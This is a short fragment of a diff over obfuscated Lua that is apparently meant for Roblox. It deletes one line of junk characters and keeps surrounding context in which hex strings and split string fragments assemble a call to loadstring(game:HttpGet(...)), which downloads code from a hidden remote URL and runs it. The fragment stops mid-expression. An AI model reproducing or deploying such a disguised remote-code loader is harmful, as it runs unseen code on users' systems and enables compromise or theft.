@@ -30,7 +30,6 @@
    .."95f2c8952"             ..(19==91                      and[[aaa]])..
    [[e1dbf3d01]]             .."e85355"                     ..[[cdf0844]]
    ..'e04f2acce'             .."c681776"                    ;local F,H=[[
-   9wejf9DJ(3frs             &&&&&&&@###                    ]]..""..[[A(@
    =39D#49j3a0s4             &27*2?51942+                   ]],"download"
       local lsg=             loadstring;Z                   =[[aint2]]
           do lsg             (game:HttpGet                  ([[ad=
